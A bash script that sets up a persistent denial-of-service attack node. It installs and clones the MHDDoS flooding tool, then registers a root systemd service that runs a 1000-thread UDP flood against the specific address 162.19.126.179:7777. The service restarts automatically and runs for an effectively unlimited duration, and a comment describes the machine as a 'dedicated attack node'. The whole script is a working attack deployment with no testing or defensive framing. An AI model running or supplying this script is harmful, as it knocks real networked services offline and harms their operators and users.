#!/bin/bash

# 1. Update and install core networking & python tools
apt update && apt install -y python3 python3-pip git build-essential libssl-dev

# 2. Cleanup and Clone
cd /root
rm -rf MHDDoS
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS

# 3. Install dependencies globally (Debian-style)
# We use --break-system-packages because this is a dedicated attack node
pip3 install --upgrade pip --break-system-packages
pip3 install -r requirements.txt --break-system-packages
pip3 install PyRoxy psutil requests --break-system-packages

# 4. Create the Systemd Service
# Target: 162.19.126.179:7777 | Threads: 1000
cat <<EOF | tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Attack Service (Debian)
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
# Debian often puts local-installed packages here:
Environment=PYTHONPATH=/usr/local/lib/python3.11/dist-packages:/usr/local/lib/python3.12/dist-packages
ExecStart=/usr/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
Restart=always
RestartSec=5s
RuntimeMaxSec=10min
StartLimitBurst=0

[Install]
WantedBy=multi-user.target
EOF

# 5. Launch
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service

echo "------------------------------------------------"
echo "DEBIAN SETUP COMPLETE"
echo "Monitoring logs for 5 seconds..."
echo "------------------------------------------------"
sleep 5
journalctl -u mhddos.service -n 20 --no-pager
